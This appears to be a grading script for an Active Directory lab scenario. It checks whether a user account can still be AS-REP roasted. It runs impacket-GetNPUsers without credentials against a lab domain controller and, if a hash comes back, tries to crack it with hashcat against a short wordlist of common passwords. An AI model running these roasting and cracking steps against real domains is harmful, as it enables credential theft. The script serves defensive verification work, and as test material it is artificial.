#!/usr/bin/env bash
# meta4/ad-vm/scenario-04/verify-poc.sh
# PASS (exit 0) iff dave's account cannot be AS-REP roasted.
#
# FAILS CLOSED, and grades the right thing.
#
# The previous version had three defects:
#   1. `no AS-REP hash dumped -- BLOCKED; exit 0` fired whenever the tool was
#      missing. /usr/bin/impacket-GetNPUsers did not exist on the attacker, so
#      this scenario reported PASS on an unmodified vulnerable box.
#   2. `hashcat unavailable -- BLOCKED; exit 0` did the same; hashcat was never
#      installed either.
#   3. Worst: `AS-REP obtained but pwd uncracked -- BLOCKED; exit 0`. If an
#      AS-REP hash was extracted then dave still carries UF_DONT_REQUIRE_PREAUTH
#      and the host IS vulnerable. The remediation is to clear that flag, not to
#      choose a password a six-word wordlist misses. Grading on crack success
#      made the verdict depend on password strength rather than on the
#      misconfiguration under test.
#
# Correct semantics: extracting the AS-REP hash IS the exploit. Cracking is
# reported for context but never changes the verdict.

set -uo pipefail

GETNPUSERS=/usr/bin/impacket-GetNPUsers
DC_IP=10.20.30.5

# --- tool preflight: a missing grader dependency must never look like a pass ---
if [ ! -x "$GETNPUSERS" ]; then
    echo "[verify-poc-04] HARNESS ERROR: $GETNPUSERS missing or not executable" >&2
    exit 2
fi

cd "$(mktemp -d)" || { echo "[verify-poc-04] HARNESS ERROR: mktemp failed" >&2; exit 2; }
echo dave > users.txt

"$GETNPUSERS" 'corp.local/' \
    -usersfile users.txt \
    -dc-ip "$DC_IP" \
    -no-pass \
    -outputfile asrep.hashes >out.txt 2>&1
RC=$?

echo "--- GetNPUsers output (rc=$RC) ---"
cat out.txt
echo "--- /GetNPUsers ---"

# --- exploited: an AS-REP was obtained without credentials ---
if [ -s asrep.hashes ]; then
    echo "--- AS-REP hash recovered ---"
    cat asrep.hashes

    # Cracking is informational only. Whether a weak password happens to be in
    # our wordlist has no bearing on whether pre-auth is enforced.
    if command -v hashcat >/dev/null 2>&1; then
        cat > wl <<'EOF'
Password1!
Winter24
Summer24
Autumn24
Spring24
Welcome1
EOF
        CRACK=$(timeout 30 hashcat -m 18200 -a 0 --quiet --potfile-path=/dev/null asrep.hashes wl 2>&1 || true)
        echo "--- hashcat (informational) ---"
        echo "$CRACK"
        # Informational only here -- this scenario grades on whether the AS-REP
        # was obtainable, not on crack success -- but say so plainly rather
        # than letting a non-functional tool look like a clean run.
        if echo "$CRACK" | grep -qiE 'No devices found/left|requires? this runtime|OpenCL.*not (found|available)'; then
            echo "[verify-poc-04] note: hashcat has no usable OpenCL device; crack step skipped." >&2
            echo "[verify-poc-04] this does NOT affect the verdict -- extracting the AS-REP is the exploit." >&2
        fi
    else
        echo "[verify-poc-04] hashcat absent; skipping the informational crack step" >&2
    fi

    echo "[verify-poc-04] AS-REP roasting SUCCEEDED - dave still has UF_DONT_REQUIRE_PREAUTH" >&2
    exit 1
fi

# --- explicitly blocked: the DC says pre-auth is required ---
# The exact string impacket emits is:
#   [-] User dave doesn't have UF_DONT_REQUIRE_PREAUTH set
# Note the CONTRACTION. An earlier version of this check matched "does not
# have", which never fires, so a correctly remediated account graded
# INCONCLUSIVE -> FAIL. Confirmed against the live lab by proof gate 2.
# The pattern below is deliberately loose around the apostrophe so both
# spellings match if impacket ever changes wording.
if grep -qiE "user dave is not vulnerable|preauthentication required|(does not|doesn.t) have UF_DONT_REQUIRE_PREAUTH|UF_DONT_REQUIRE_PREAUTH set" out.txt; then
    echo "[verify-poc-04] dave requires Kerberos pre-authentication - PoC BLOCKED"
    exit 0
fi

# --- anything else fails closed ---
echo "[verify-poc-04] no AS-REP and no recognised pre-auth signal - INCONCLUSIVE, grading FAIL" >&2
echo "[verify-poc-04] the probe could not reach a verdict; that is not evidence of remediation" >&2
exit 1
